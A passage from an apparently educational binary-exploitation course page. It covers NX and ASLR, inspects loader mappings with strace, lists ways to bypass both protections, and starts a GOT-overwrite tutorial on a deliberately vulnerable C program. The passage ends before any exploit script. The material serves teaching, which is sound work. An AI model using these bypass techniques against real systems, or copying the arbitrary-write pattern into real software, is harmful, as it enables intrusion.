.eh_frame_hdr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   07</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   08     .init_array .fini_array .jcr .dynamic .got</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Check the <code>Flg</code> column.
For example, the first <code>LOAD</code> segment contains <code>.text</code> and is marked <code>R E</code>, while the <code>GNU_STACK</code> segment is marked <code>RW</code>.</p><p>Next we are interested in seeing calls to <code>mmap2()</code> and <code>mprotect()</code> made by the loader.
We are going to use the <code>strace</code> tool for this, and directly execute the loader.
You can check the path to the loader on your system using <code>ldd hello</code>.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The output should be similar to:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[ Process PID=11198 runs in 32 bit mode. ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mprotect(0xf7fcd000, 8192, PROT_READ)   = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mprotect(0x8049000, 4096, PROT_READ)    = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mprotect(0x56575000, 4096, PROT_READ)   = 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can observe a <code>PROT_READ|PROT_EXEC</code> mapping at address <code>0x8048000</code>, followed by a <code>PROT_READ|PROT_WRITE</code> at address <code>0x8049000</code> that is later changed to <code>PROT_READ</code> for the first half (4096 bytes).
The later allocation is the data segment, that should be writable.
We can also see a bunch of allocations for segments belonging to dynamic libraries.</p><p>Note that the <strong>stack</strong> is not explicitly allocated by the loader.
The kernel will keep increasing it each time a page fault is triggered without calling <code>mmap</code>.
Also, the <strong>heap</strong> will be extended on-demand as the application requires it.</p><p>We can dump all memory mappings of the running process as follows:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ps u | grep /lib/ld-linux.so.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... # get the PID of the loader process from this output, let&#x27;s assume it is 11198</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ cat /proc/11198/maps</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Make sure to use the PID of the loader process, and not the <code>strace</code> process.</p><p>The output of the last <code>cat</code> command should be similar to:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">08048000-08049000 r-xp 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">08049000-0804a000 r--p 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0804a000-0804b000 rw-p 00001000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">56555000-56575000 r-xp 00000000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">56575000-56576000 r--p 0001f000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">56576000-56577000 rw-p 00020000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7e23000-f7e24000 rw-p 00000000 00:00 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7e24000-f7fcd000 r-xp 00000000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7fcd000-f7fcf000 r--p 001a9000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7fcf000-f7fd0000 rw-p 001ab000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7fd0000-f7fd3000 rw-p 00000000 00:00 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7ffa000-f7ffd000 rw-p 00000000 00:00 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f7ffd000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ways-of-bypassing-nx">Ways of Bypassing NX<a class="hash-link" href="#ways-of-bypassing-nx" title="Direct link to heading">​</a></h3><p>Below are a few methods of exploiting a binary that has <strong>NX</strong> enabled:</p><ul><li><code>ret-to-plt/libc</code>:
You can return to the <code>.plt</code> section and call library function already linked.
You can also call other library functions based on their known offsets.
The latter approach assumes no ASLR (see next section), or the possibility of an information leak.</li><li><code>mprotect()</code>:
If the application is using <code>mprotect()</code> you can easily call it to modify the permissions and include <code>PROT_EXEC</code> for the stack.
You can also call this in a <code>ret-to-libc</code> attack.
You can also <code>mmap</code> a completely new memory region and dump the shellcode there.</li><li>Return Oriented Programming (<code>ROP</code>):
This is a generalization of the <code>ret-to-*</code> approach that makes use of existing code to execute almost anything.
As this is probably one of the most common types of attacks, it will be discussed in depth in a future section.</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="address-space-layout-randomization">Address Space Layout Randomization<a class="hash-link" href="#address-space-layout-randomization" title="Direct link to heading">​</a></h3><p><strong>Address Space Layout Randomization (<code>ASLR</code>)</strong> is a security feature that maps different memory regions of an executable at random addresses.
This prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary).
Usually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries.
The code section can also be randomly mapped for <a href="https://en.wikipedia.org/wiki/Position-independent_code#PIE" target="_blank" rel="noopener noreferrer"><code>PIE</code></a> binaries.</p><p>Linux allows 3 options for its ASLR implementation that can be configured using the <code>/proc/sys/kernel/randomize_va_space</code> file.
Writing <strong>0</strong>, <strong>1</strong> or <strong>2</strong> to this will results in the following behaviors:</p><ul><li><strong>0</strong>: deactivated;</li><li><strong>1</strong>: random stack, vdso, libraries;
heap is after code section;
random code section (only for PIE-linked binaries);</li><li><strong>2</strong>: random heap too.</li></ul><p>Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below.</p><p>If you disabled ASLR system-wide, re-enable it using (root access is required):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo bash -c &#x27;echo 2 &gt; /proc/sys/kernel/randomize_va_space&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If you disabled ASLR at shell level, simply <strong>close the shell</strong> such as issuing the <code>Ctrl+d</code> keyboard shortcut.</p><p>We can easily demonstrate the effects of ASLR on shared libraries by running <code>ldd</code> multiple times in a row on a binary such as <code>/bin/ls</code>.</p><p>In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier.
However, when developing exploits we will sometimes want to test them in conjunction with ASLR.
To enable ASLR in GDB, use the following command:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; set disable-randomization off</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ways-of-bypassing-aslr">Ways of Bypassing ASLR<a class="hash-link" href="#ways-of-bypassing-aslr" title="Direct link to heading">​</a></h3><p>Below are a few methods of exploiting a binary that has <strong>ASLR</strong> enabled:</p><ul><li><p><strong>Brute force</strong>:
If you are able to inject payloads multiple times without crashing the application, you can brute-force the address you are interested in (e.g., a target in libc).
Otherwise, you can just run the exploit multiple times.
Another thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent.
Take the following scenario: we interact with a vulnerable sever that handles connections by forking to another process.
We manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution.
However, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.</p></li><li><p><strong>NOP sled</strong>:
In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized.
This is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.</p></li><li><p><strong><code>jmp esp</code></strong>:
This will basically jump into the stack, no matter where it is mapped.
It&#x27;s actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.</p></li><li><p><strong>Restrict entropy</strong>:
There are various ways of reducing the entropy of the randomized address.
For example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.</p></li><li><p><strong>Partial overwrite</strong>:
This technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry).
We must take into account the offsets of the original and final addresses from the beginning of the mapping.
If these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000.
The offsets of <code>read</code> and <code>write</code> in <code>libc6_2.27-3ubuntu1.2_i386</code> are suitable for a partial overwrite:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; p read</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$1 = {&lt;text variable, no debug info&gt;} 0xe6dd0 &lt;__GI___libc_read&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; p write</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$2 = {&lt;text variable, no debug info&gt;} 0xe6ea0 &lt;__GI___libc_write&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be brute-forced (probability 1/4).</p></li><li><p><strong>Information leak</strong>:
The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them.
You can also dump parts of libraries (e.g. <code>libc</code>) if you are able to create an exploit that reads them.
This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary).</p></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="chaining-information-leaks-with-got-overwrite">Chaining Information Leaks with GOT Overwrite<a class="hash-link" href="#chaining-information-leaks-with-got-overwrite" title="Direct link to heading">​</a></h3><p>In this tutorial we will exploit a program that is similar to the <code>no-ret-control</code> challenge from a previous session:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Here&#x27;s a libc address: 0x%08x\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> printf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Give me and address to modify!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%p&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Give me a value!\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%u&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Abandon all hope ye who reach this...\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The goal is to alter the execution flow and avoid reaching the final <code>printf</code>.
To this end, we will overwrite the <code>sleep</code> entry in GOT and redirect it to <code>exit</code>.
However, due to ASLR, the value can not be hardcoded and must be computed at runtime.</p><p>Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library.
We can identify this build either by its <code>BuildID</code> (retrieved with the file command), or by its version string:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ ldd ./got_overwrite</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    linux-gate.so.1 (0xf7ee8000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    /lib/ld-linux.so.2 (0xf7ee9000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep &quot;GLIBC &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Alternatively, if we don&#x27;t have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0xf7df6250 &lt;__libc_system&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xf7e780e0 &lt;__sleep&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The least significant 3 nibbles of the above addresses are <code>250</code> and <code>0e0</code>, respectively.</p><p>We enter them in the <a href="https://libc.blukat.me/" target="_blank" rel="noopener noreferrer">libc database</a> and get a match for the same <code>libc</code> build we determined earlier.</p><p>For this <code>libc</code>, we obtain the offsets of the functions we are interested in using GDB:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) p printf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$1 = {&lt;text variable, no debug info&gt;} 0x513a0 &lt;__printf&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) p exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$2 = {&lt;text variable, no debug info&gt;} 0x30420 &lt;__GI_exit&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" 